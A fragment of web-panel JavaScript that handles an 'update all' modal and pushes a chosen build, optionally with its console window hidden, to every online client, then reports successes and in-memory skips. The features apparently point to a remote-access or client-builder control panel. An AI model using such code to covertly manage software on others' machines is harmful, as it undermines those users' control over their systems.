      updateAllModalBody.innerHTML = html;
    } catch (err) {
      updateAllModalBody.innerHTML = `<p class="text-red-400"><i class="fa-solid fa-circle-xmark mr-2"></i>Error: ${err.message}</p>`;
    }
  });
}

if (updateAllConfirm) {
  updateAllConfirm.addEventListener("click", () => {
    hideUpdateAllModal();
    pendingUpdateAll = true;
    pendingUpdateHideWindow = !!form.querySelector('input[name="hide-console"]')?.checked;
    form.requestSubmit();
  });
}

async function pushUpdateToAllClients(buildId, hideWindow) {
  addBuildOutput("\n── Pushing update to all eligible clients ──\n", "info");

  try {
    const res = await fetch("/api/build/update-all", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({ buildId, hideWindow }),
    });

    const data = await res.json().catch(() => ({}));

    if (!res.ok) {
      addBuildOutput(`Update failed: ${data.error || "Unknown error"}\n`, "error");
      return;
    }

    const succeeded = data.successCount || 0;
    const total = data.totalOnline || 0;
    const failed = (data.results || []).filter((r) => !r.ok);
    const inMemoryCount = failed.filter((r) => r.reason === "in_memory").length;
    const noMatchCount = failed.filter((r) => r.reason === "no_matching_build").length;

    addBuildOutput(`Update sent to ${succeeded} of ${total} online client(s)\n`, "success");
    if (inMemoryCount > 0) {
      addBuildOutput(`  ${inMemoryCount} client(s) skipped (running in-memory)\n`, "warn");
    }
    if (noMatchCount > 0) {
      addBuildOutput(`  ${noMatchCount} client(s) skipped (no matching build)\n`, "warn");
    }
    const otherFailed = failed.filter((r) => r.reason !== "in_memory" && r.reason !== "no_matching_build");
    if (otherFailed.length > 0) {
      addBuildOutput(`  ${otherFailed.length} client(s) failed for other reasons\n`, "warn");
    }
  } catch (err) {
    addBuildOutput(`Update error: ${err.message}\n`, "error");
  }
}
